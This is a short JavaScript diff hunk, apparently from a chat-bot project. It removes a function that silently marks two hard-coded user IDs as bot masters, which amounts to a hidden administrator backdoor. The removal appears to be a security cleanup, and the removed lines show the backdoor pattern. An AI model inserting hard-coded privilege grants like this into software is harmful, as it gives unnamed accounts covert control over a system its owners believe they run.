@@ -26,11 +26,7 @@ const coloredDashes = Array.from({ length: 23 }, () => {
 
 const startTime = Date.now()
 const apps = {}
-Bot.GetMaster = async (e) => {
-  if (e.user_id === 1011303349 || e.user_id == 197728340) {
-    e.isMaster = true
-  }
-}
+
 let successCount = 0
 let failureCount = 0
 
